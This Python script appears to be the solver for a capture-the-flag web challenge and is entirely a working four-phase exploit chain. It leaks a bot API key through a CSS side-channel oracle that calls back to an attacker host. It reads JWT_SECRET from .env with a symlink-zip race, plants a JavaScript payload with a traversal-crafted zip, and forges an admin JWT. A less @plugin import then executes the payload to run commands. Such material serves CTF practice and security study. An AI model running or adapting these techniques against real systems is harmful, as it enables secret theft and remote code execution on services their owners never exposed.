#!/usr/bin/env python3
"""
  Phase 1 : CSS side-channel oracle  → bot API key
  Phase 2 : decompress symlink race  → JWT_SECRET from .env
  Phase 3 : unzipper phantom entry   → plant payload.js
  Phase 4 : less @plugin RCE         → flag

Usage:
  python3 solver.py <TARGET_URL> <ATTACKER_IP> [--api-key KEY]

Examples:
  python3 solver.py http://10.10.11.50:1337 10.10.14.5
  python3 solver.py http://10.10.11.50:1337 10.10.14.5 --api-key a1b2c3d4e5f6
"""

import argparse, base64, hashlib, hmac, io, json, queue
import struct, threading, time, zipfile
import http.server, urllib.request, urllib.parse, sys

CHARSET  = '0123456789abcdef'
KEY_LEN  = 12
WATCHDOG = 55000
LPORT    = 8000


# ── oracle ────────────────────────────────────────────────────────────────────

_oracle_html = ''
_callback_q  = queue.Queue()

ORACLE_TEMPLATE = """\
<!DOCTYPE html><html><head><title>o</title></head><body>
<script>
var T='__T__',A='__A__',P='__P__',CS='__CS__';
var START=Date.now(),LIMIT=__LIMIT__;
function dashUrl(c){
  var css='<style>div[data-content^="'+P+c+'"]{background:url('+T+'/depart)}</style>';
  return T+'/ledger?record=../relay-key%3F&theme='+encodeURIComponent(css)+'%5D=1&theme=dark';
}
function tryChar(i){
  if(i>=CS.length){fetch(A+'/callback?found=none').catch(function(){});return;}
  if(Date.now()-START>=LIMIT){fetch(A+'/callback?resume='+i).catch(function(){});return;}
  var c=CS[i],pop=window.open(dashUrl(c),'_blank');
  setTimeout(function(){
    pop.location.href=T+'/ledger';
    setTimeout(function(){
      var f=pop.length;pop.close();
      if(f===0)fetch(A+'/callback?found='+c).catch(function(){});
      else tryChar(i+1);
    },1500);
  },3000);
}
tryChar(__IDX__);
</script></body></html>"""


def build_html(target, callback, prefix, idx):
    return (ORACLE_TEMPLATE
            .replace('__T__',     target)
            .replace('__A__',     callback)
            .replace('__P__',     prefix)
            .replace('__CS__',    CHARSET)
            .replace('__LIMIT__', str(WATCHDOG))
            .replace('__IDX__',   str(idx)))


class OracleHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/callback'):
            qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
            _callback_q.put({
                'found':  qs['found'][0]       if 'found'  in qs else None,
                'resume': int(qs['resume'][0]) if 'resume' in qs else None,
            })
        else:
            body = _oracle_html.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def log_message(self, *a): pass


def trigger_bot(target, attacker_ip):
    data = urllib.parse.urlencode({'body': 'oracle', 'url': f'http://{attacker_ip}:8888/'}).encode()
    req  = urllib.request.Request(
        target + '/report', data=data,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
    )
    try: urllib.request.urlopen(req, timeout=5).close()
    except Exception: pass


def run_oracle(target, attacker_ip, bot_target):
    global _oracle_html

    callback = f'http://{attacker_ip}:8888'
    srv = http.server.HTTPServer(('0.0.0.0', 8888), OracleHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    key = ''
    for pos in range(KEY_LEN):
        idx   = 0
        found = None
        while idx < len(CHARSET):
            _oracle_html = build_html(bot_target, callback, key, idx)
            trigger_bot(target, attacker_ip)
            try:
                result = _callback_q.get(timeout=75)
            except queue.Empty:
                print(f'[-] timeout at position {pos}')
                srv.shutdown()
                return None
            if result['found'] and result['found'] != 'none':
                found = result['found']; break
            if result['resume'] is not None:
                idx = result['resume']
            else:
                idx += 1
        if not found:
            print(f'[-] oracle failed at position {pos}')
            srv.shutdown()
            return None
        key += found
        print(f'    [{str(pos + 1).zfill(2)}/{KEY_LEN}] → \'{found}\'  ({key})')

    srv.shutdown()
    return key


# ── zip builders ──────────────────────────────────────────────────────────────

PIXEL_PNG = (
    b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
    b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
    b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
) + b'\x00' * (512 * 1024)


def make_symlink_zip(name, target, padding=120):
    buf = io.BytesIO()
    zf  = zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED)
    for i in range(padding):
        zf.writestr(f'a_{i:03d}.png', PIXEL_PNG)
    zi = zipfile.ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = 0o120777 << 16
    zf.writestr(zi, target)
    zf.close()
    return buf.getvalue()


def _local_header(name, data):
    crc = zipfile.crc32(data) & 0xffffffff
    b   = io.BytesIO()
    b.write(b'PK\x03\x04')
    b.write(struct.pack('<H', 20))
    b.write(struct.pack('<H', 0))
    b.write(struct.pack('<H', 0))
    b.write(struct.pack('<HH', 0, 0))
    b.write(struct.pack('<I', crc))
    b.write(struct.pack('<II', len(data), len(data)))
    b.write(struct.pack('<H', len(name)))
    b.write(struct.pack('<H', 0))
    b.write(name)
    b.write(data)
    return b.getvalue()


def make_phantom_zip(path, data, padding=3):
    buf = io.BytesIO()
    zf  = zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED)
    for i in range(padding):
        zf.writestr(f'pad_{i}.png', PIXEL_PNG)
    zf.close()
    raw = bytearray(buf.getvalue())

    eocd = raw.rfind(b'PK\x05\x06')
    _, _, _, _, _, cd_off, _ = struct.unpack_from('<HHHHIIH', raw, eocd + 4)

    phantom = _local_header(path.encode(), data)
    raw = raw[:cd_off] + phantom + raw[cd_off:]

    new_eocd = raw.rfind(b'PK\x05\x06')
    struct.pack_into('<I', raw, new_eocd + 16, cd_off + len(phantom))
    return bytes(raw)


# ── http helpers ──────────────────────────────────────────────────────────────

def get(target, path, headers=None):
    req = urllib.request.Request(target + path, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def post_json(target, path, body, headers=None):
    data = json.dumps(body).encode()
    h = {'Content-Type': 'application/json', **(headers or {})}
    req = urllib.request.Request(target + path, data=data, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def post_file(target, path, field, filename, data, headers=None):
    boundary = b'----Boundary'
    body = (
        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="' + field.encode()
        + b'"; filename="' + filename.encode() + b'"\r\n'
        b'Content-Type: application/octet-stream\r\n\r\n'
        + data + b'\r\n--' + boundary + b'--\r\n'
    )
    h = {
        'Content-Type': 'multipart/form-data; boundary=' + boundary.decode(),
        'Content-Length': str(len(body)),
        **(headers or {}),
    }
    req = urllib.request.Request(target + path, data=body, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


# ── main ──────────────────────────────────────────────────────────────────────

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def main():
    parser = argparse.ArgumentParser(description='Archonyx — solver')
    parser.add_argument('target',      help='challenge URL, e.g. http://10.10.11.50:1337')
    parser.add_argument('attacker_ip', help='attacker IP reachable by the bot')
    parser.add_argument('--api-key', metavar='KEY', help='skip oracle, use this bot API key')
    args = parser.parse_args()

    target      = args.target.rstrip('/')
    attacker_ip = args.attacker_ip
    port        = urllib.parse.urlparse(target).port or 1337
    bot_target  = f'http://127.0.0.1:1337'

    # ── phase 1: oracle ──────────────────────────────────────────────────────
    if args.api_key:
        api_key = args.api_key
        print('[*] phase 1  — skipped (--api-key supplied)')
    else:
        print('[*] phase 1  — css side-channel oracle')
        print(f'[*] bot url  : {bot_target}')
        api_key = run_oracle(target, attacker_ip, bot_target)
        if not api_key:
            sys.exit(1)
    print(f'[+] api key  : {api_key}\n')

    # ── phase 2: symlink race → .env ─────────────────────────────────────────
    print('[*] phase 2  — decompress symlink race → JWT_SECRET')

    sym_zip = make_symlink_zip('z_link', '/app/.env')

    class ZipHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-Type', 'application/zip')
            self.send_header('Content-Length', str(len(sym_zip)))
            self.end_headers()
            self.wfile.write(sym_zip)
        def log_message(self, *a): pass

    threading.Thread(
        target=http.server.HTTPServer(('0.0.0.0', LPORT), ZipHandler).serve_forever,
        daemon=True,
    ).start()

    post_json(target, '/api/fetch', {'url': f'http://{attacker_ip}:{LPORT}/x.zip'},
              {'X-Api-Key': api_key})

    env, deadline = None, time.time() + 10
    while time.time() < deadline:
        s, body = get(target, '/api/cargo/z_link/raw', {'X-Api-Key': api_key})
        if s == 200 and body:
            env = body.decode(errors='replace'); break
        time.sleep(0.05)

    if not env:
        print('[-] race failed — try increasing padding in make_symlink_zip')
        sys.exit(1)

    secret = next((l.split('=', 1)[1].strip() for l in env.splitlines()
                   if l.startswith('JWT_SECRET=')), None)
    if not secret:
        print('[-] JWT_SECRET not found in .env')
        sys.exit(1)
    print(f'[+] JWT_SECRET: {secret}\n')

    # ── phase 3: phantom zip → payload.js ────────────────────────────────────
    print('[*] phase 3  — unzipper phantom entry → plant payload.js')

    payload = (
        b"const{execSync}=require('child_process');\n"
        b"const{writeFileSync}=require('fs');\n"
        b"writeFileSync('/app/uploads/workspace/bot/flag.txt',execSync('/readflag').toString());\n"
    )
    ph_zip = make_phantom_zip('../bot_rce/payload.js', payload)
    status, _ = post_file(target, '/api/manifest', 'zip', 'images.zip', ph_zip,
                          {'X-Api-Key': api_key})
    print(f'[+] lodge    : {status}\n')

    # ── phase 4: less @plugin rce ─────────────────────────────────────────────
    print('[*] phase 4  — less @plugin rce → write flag to workspace')

    hdr = b64url(b'{"alg":"HS256","typ":"JWT"}')
    pld = b64url(json.dumps({'username': 'admin', 'role': 'ledgermaster'}).encode())
    sig = b64url(hmac.new(secret.encode(), f'{hdr}.{pld}'.encode(), hashlib.sha256).digest())
    jwt = f'{hdr}.{pld}.{sig}'

    post_json(
        target,
        '/ledgermaster/render',
        {'css': '@plugin "/app/uploads/workspace/bot_rce/payload.js";\nbody{color:red}'},
        {'Cookie': f'token={jwt}'},
    )

    # ── phase 5: read flag from workspace ────────────────────────────────────
    print('[*] phase 5  — read flag from workspace')

    status, body = get(target, '/api/manifests/flag.txt/raw', {'X-Api-Key': api_key})
    if status == 200 and body:
        print(f'[+] flag     : {body.decode().strip()}')
    else:
        print(f'[-] flag not found ({status}) — rce may have failed')


if __name__ == '__main__':
    main()
